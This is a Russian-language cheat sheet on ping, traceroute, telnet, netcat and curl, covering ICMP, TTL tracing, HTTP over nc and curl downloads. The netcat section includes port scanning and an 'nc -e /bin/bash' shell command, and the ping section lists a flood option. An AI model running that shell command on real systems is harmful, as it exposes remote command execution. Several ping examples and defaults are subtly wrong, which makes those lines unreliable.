## § Ping
Утилита *ping* использует для своей работы *ICMP* (*Internet Control Message Protocol*) — протокол межсетевых управляющих сообщений.

Дело в том, что протокол *IP* предоставляет сервис передачи данных без гарантии доставки, в случае ошибки при передаче пакета никаких действий не предпринимается.

Информация об ошибках, возникающих на сетевом уровне, передаётся по протоколу *ICMP*. Также протокол *ICMP* используется для диагностики работоспособности сети.

N.B.: *ICMP* cообщения об обнаруженных ошибках могут быть проигнорированы как протоколом *IP*, так и сами протоколом *ICMP*.

Большая часть *ICMP* сообщений формируется и отправляется автоматически сетевым оборудованием. Однако некоторые типы сообщений формируются и отправляются утилитами, используемыми для диагностики работоспособности сетей, такими как
- *ping*
- *traceroute* (или *tracert* в *Windows*)

Итак, утилита ping 
- используется для проверки доступности компьютера в сети
- использует *ICMP echo-protocol*

`$ ping google.com`
`$ ping 172.217.163.46`

| host 1                                                           |     | host 2                                                            |
| ---------------------------------------------------------------- | :-: | ----------------------------------------------------------------- |
| *ICMP* echo request:<br>• message type = 8<br>• message code = 0 |  ↔  | *ICMP* echo response:<br>• message type = 0<br>• message code = 0 |

Если от некоторого компьютера не удаётся получить *echo response* в ответ на отправленный ему ранее *echo request*, то такой компьютер, считается недоступным для подключения.

The *ping* issue is that it does not test *TCP* connectivity to a particular port. It was designed in mind when there used to be no firewalls or restrictions between two hosts.

However, in the modern world, *ICMP* traffic is usually restricted. So, valid connectivity between two hosts at a particular port may exist while the *ping* command shows the host is unreachable.

### Установка колиества отправляемых пакетов
По умолчанию команда *ping* посылает пакеты, пока пользователь не прервет выполнение команды сигналом *SIGTERM*. Однако количество отправляемых пакетов можно задать явно.

`$ ping -c 3 172.217.163.46` — будет отправлено 3 пакета

### Привет железным сетевикам
Если ответа от хоста нет, и надо поковыряться в проводах, торчащих из серверной стойке, вводим вот эту команду: `$ ping -a 5 172.217.163.46`

А затем начинаем искать причину сбоя. После ее устранения воспроизведется звуковой сигнал, сигнализирующий о том, что хост начал отвечать.
### Установка временного интервала
По умолчанию пакеты отправляются с интервалом в одну секунду, однако, длину интервала можно настроить.

`$ ping -i 5 172.217.163.46` — 5 секунд между отправкой пакетов
`$ ping -i 0.2 172.217.163.46` — 0.2 секунды между отправкой пакетов

### Массовая отправка пакетов
`$ ping -f 0.2 172.217.163.46` — сотни тысяч пакетов будут отправлены в следующую секнду

### Изменение размера пакета
По умолчанию размер пакета = 32 байта, но можно установить и другой размер.

`$ ping -s 172.217.163.46` — размер указываются в байтах

### Вывод только итоговой статистики
`$ ping -c 5 -q 172.217.163.46` — пропустить ответы хоста, чтобы не засорять терминал лишней информацией

## § Traceroute
Утилита *traceroute* опеределяет адреса всех машрутизаторов, через которые проходит пакет на пути от отправителя к получателю.

`$ traceroute google.com`

Как именно это работает? Утилита *traceroute* отправляет пакет, у которого *TTL* — время жизни пакета — установлено равным 1.

Первый маршрутизатор получает сообщение, уманьшает значение *TTL* на единицу, значение *TTL* становится равным 0, поэтому маршрутизатор не пересылает сообщение дальше, а отправляет в ответ *ICMP* сообщение, содержащее message code = 11 — время жизни истекло.

Утилита получает отправленное первым роутером  *ICMP* сообщение и извлекает из его заголовка *IP* адрес первого роутера.

| host 1    |     | router 1  |     | router2 |     | host 2 |
| --------- | :-: | --------- | --- | ------- | :-: | ------ |
| *TTL* = 1 |  →  | *TTL* = 0 |     |         | ... |        |

| host 1    |     | router 1                                                     |     | router2 |     | host 2 |
| --------- | :-: | ------------------------------------------------------------ | --- | ------- | :-: | ------ |
| *TTL* = 2 |  ←  | *ICMP* message:<br>• message type = 11<br>• message code = 0 |     |         | ... |        |

Утилита *traceroute* отправляет пакет, у которого *TTL* — время жизни пакета — установлено равным 2.

Первый марщрутизатор получает сообщение, уманьшает значение *TTL* на единицу и пересылает сообщение второму маршрутизатору.

Второй маршрутизатор получает сообщение, уманьшает значение *TTL* на единицу, значение *TTL* становится равным 0, поэтому маршрутизатор не пересылает сообщение дальше, а отправляет в ответ *ICMP* сообщение с message type = 11 — время жизни истекло.

Утилита получает отправленное вторым роутером  *ICMP* сообщение и извлекает из его заголовка *IP* адрес второго роутера.

| host 1    |     | router 1  |     | router2   |     | host 2 |
| --------- | :-: | --------- | --- | --------- | :-: | ------ |
| *TTL* = 2 |  →  | *TTL* = 1 | →   | *TTL* = 0 | ... |        |

| host 1    |     | router 1C                                                    |     | router2                                                      |     | host 2 |
| --------- | :-: | ------------------------------------------------------------ | --- | ------------------------------------------------------------ | :-: | ------ |
| *TTL* = 2 |  ←  | *ICMP* message:<br>• message type = 11<br>• message code = 0 | ←   | *ICMP* message:<br>• message type = 11<br>• message code = 0 | ... |        |

И так далее.

## § Telnet
Утилита *telnet* использует для своей работы протокол *TCP*. Когда-то давно утилита *telnet* использовалась для запуска *bash* команд на удалённых хостах. Однако протокол *ssh* оказался более безопасным благодаря поддержке тунеллирования и шифрованию трафика.

Сегодня *telnet*  в основном используется либо для проверки доступности удалённого хостоа, аналогично утилите *ping*.

`$ telnet google.com`
`$ telnet 172.217.163.46`

Либо для проверки доступности определённго порта на удалённом хосте. 

`$ telnet 172.217.163.46 443`
`$ telnet google.com 443`

Порт по умолчанию для *telnet* = 23.

The issue with *telnet* is that it transfers everything in plaintext. So, if you type a password in it, it will be transferred without encryption. Due to this reason, many popular flavors of *Linux*, such as *Fedora*, *CentOS*, and *RHEL*, do not include this utility anymore in standard *Linux* distributions. It can be installed manually though.

## § Netcat

### Отправка *HTTP*-запросов

При отправке *HTTP*-запроса утилитой *nc* все параметры запроса могут вводиьтся последовательно, один за другим (в качестве примера — GET-запрос):

|                                                                |             |             |
| -------------------------------------------------------------- | ----------- | ----------- |
| `nc google.com 80` <br>`nc 142.250.187.142 80`                 | хост и порт | **↵** Enter |
| `GET /my/query.html HTTP/1.1`                                  | метод, uri  | **↵** Enter |
| `Host: google.com`                                             | header      | **↵** Enter |
| `User-Agent: Mozilla/5.0 (Ubuntu; Linux x86_64;) Firefox/78.0` | header      | **↵** Enter |
| `Accept: text/html, application/xhtml+xml,application/xml`     | header      | **↵** Enter |
| `Accept-Language: en-US, en;q=0.5`                             | header      | **↵** Enter |
| `Accept-Encoding: gzip, deflate`                               | header      | **↵** Enter |
| `Connection: close`                                            | header      | **↵** Enter |
| ...                                                            | ...         | **↵** Enter |

Или же все параметры запроса могут быть переданы утилите *nc* одной общей составной командой (в качестве примера — POST-запрос).

Такой командой:

`(echo 'POST /my/query.jsp HTTP/1.1'`
`echo 'Host: google.com'`
`echo 'Content-Type: application/x-www-form-urlencoded'`
`echo 'Content-Length: 11'` ← размер *body* запроса в байтах
`echo`
`echo 'hello=world' ) | nc google.com 80` ← *body* запроса — *url encoded* строка, состоящая из 11 символов

Или такой командой:

`echo -e 'POST /my/query.jsp HTTP/1.1\r\nHost: google.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 1\r\n\r\nhello=world' | nc google.com 80`

### Проверка наличия открытого *TCP*-порта 
`$ nc -vz 192.168.1.100 2222`

### Сканирование *TCP*-портов
`$ nc -vnz 192.168.1.100 2222-2244`

### Сканирование *UDP*-портов
`$ nc -vnzu 192.168.1.100 2222-2244`

### Тестирование *TCP*-соединений
`$ nc -l 2222`
`$ nc -lp 2222`
`$ nc localhost 2222` — запускает сервер локально на порту 2222

`$ nc 192.168.1.100 2222` — запускает клиент, который устанавливает *TCP*-соединение с 192.168.1.100:2222, после чего может отправлять сообщения по протоколу *TCP* на этот адрес. 

После установления соединения, как сервер, так и клиент готовы 
- отправлять даныые друг другу
- принимать данные друг от друга

Все символы, введенные в окно терминала на любом из узлов появятся в окне терминала другого узла.

### Тестирование *UDP*-соединений
`$ nc -ul 2222` 
`$ nc -ulp 2222`
`$ nc -u localhost 2222`— запускает сервер локально на порту 2222, готовый принимать сообщения по протоколу *UDP*. После приёма первого сообщения вывод будет остановлен.

`$ while true; do nc -u localhost 7777; done` — если необходимо принять несколько сообщений.

`$ nc -u 192.168.1.100 2222` — запускает клиент, который может отправлять сообщения по протоколу *UDP* на адрес 192.168.1.100:2222. 

Тестирование *UDP*-соединений позволяет проверить доступность сокета, пропускную способность сети и надежность работы протокола *UDP*.

### Отправка *UDP*-пакета
`$ echo -n "foo" | nc -u -w1 192.168.1.100 2222`

### Прииём и передача файлов
`$ nc -lvp 2222 > /tmp/my_file.txt` ← приём
`$ nc 192.168.1.100 2222 < my_file.txt` ← передача

### Простейший веб-сервер
`$ while true; do nc -lp 2222 < index.html; done` → http://192.168.1.100:2222/index.htm
`$ while true; do sudo nc -lp 80 < test.html; done` — если нужен стандартный 80-й порт

### Чат между узлами
`$ nc -lp 9000` ← локальный хост
`$ nc 192.168.1.100 9000` ← удалённый хост

### Реверс-шелл
`$ nc -e /bin/bash -lp 2222` ← локальный хост
`$ nc 192.168.1.100 2222`← удалённый хост

Теперь с удалённого хоста можно выполнять команды на локальном.

## § Curl

### Скачивание файлов
`$ curl -O http://mysite.com/myfile.tar.gz` → my_file.tar.gz
`$ curl -o my_new_file.tar.gz http://mysite.com/myfile.tar.gz` → my_new_file.tar.gz

### Возобновление прерванного скачивания
`$ curl -C - -O http://mysite.com/myfile.tar.gz`

### Скачивание нескольких файлов одной командой
`$ curl -O http://mysite.com/myfile_1.tar.gz -O http://mysite.com/myfile_2.tar.gz`
`$ xargs -n 1 curl -O < my_urls_list.txt`

### Скачивание и загрузка по *FTP*
`$ curl -u my_login:my_pass -O ftp://myftp/myfile.tar.gz` — скачивание
`$ curl -u my_login:my_pass -T myfile.tar.gz ftp://myftp/myfile.tar.gz` — загрузка

### Ограничения используемых ресурсов

#### Ограничение скорости скачивания файла
`$ curl --limit-rate 100K http://mysite.com/myfile.tar.gz` — ограничить скорость скачивания файла до 100 кб/с

#### Ограничение времени скачивания файла
`$ curl -m 60 http://mysite.com/myfile.tar.gz` — ограничить время скачивания файла 60 секундами

`$ curl --connect-timeout 60 example.com` — глобальная настройка curl, ограничивающая максимальное время активного соединения с сервером

### Скачивание больших файлов по частям

*диапазон в байтах* ↴
`$ curl --range 0-99999999 http://releases.ubuntu.com/18.04/ubuntu-18.04.3-desktop-amd64.iso ubuntu-part1`

*диапазон в байтах* ↴
`$ curl --range 100000000-199999999 http://releases.ubuntu.com/18.04/ubuntu-18.04.3-desktop-amd64.iso ubuntu-part2`

...

`$ cat ubuntu-part? > ubuntu-18.04.3-desktop-amd64.iso`

### Настройка *HTTP*-запросов

#### *Cookies*
`$ curl --cookie-jar cnn_cookies.txt https://www.cnn.com/index.html -O` — записывает в файл *cnn_cookies.txt* список *cookies*, которые создаются при открытии сайта *cnn.com*.

`$ curl --cookie cnn_cookies.txt https://www.cnn.com` — сохранённые таким образом *cookies* можно использовать при отпраке запросов

#### *Headers*
`$ curl -I www.cnn.com` — запросить *http headers*

`$ curl -H 'Connection: keep-alive' -H 'Accept-Charset: utf-8 ' http://mysite.com` — добавить *http headers* в запрос

`$ curl www.mysite.com --output mysite.html` — скачать html страницу и записать её содержимое в файл

#### *Post*-запрос
`$ curl --data "param1=value1&param2=value2" https://mysite.com/my_form.php` — отправить *POST*-запрос, предварительно добавив параметры *param1* и *param2* в тело запроса

#### Отслеживание переадресации
`$ curl http://mysite/myfile.txt --output myfile.txt` ← что делать, если файл так и не скачался?

Скорее всего это означает, что на сайте при обработке этого запроса происходит перенаправление. Это — очень распространённая проблема. Для того, чтобы *curl* корректно отслеживал перенаправления, добавьте специальный ключ.

`$ curl -L http://mysite/myfile.txt --output myfile.txt`

### Ишнорирование *SSL*
`$ curl -k https://mysite.com`

### Тонны справочной информации в *verbose mode*
`$ curl -vvv https://mysite.com`
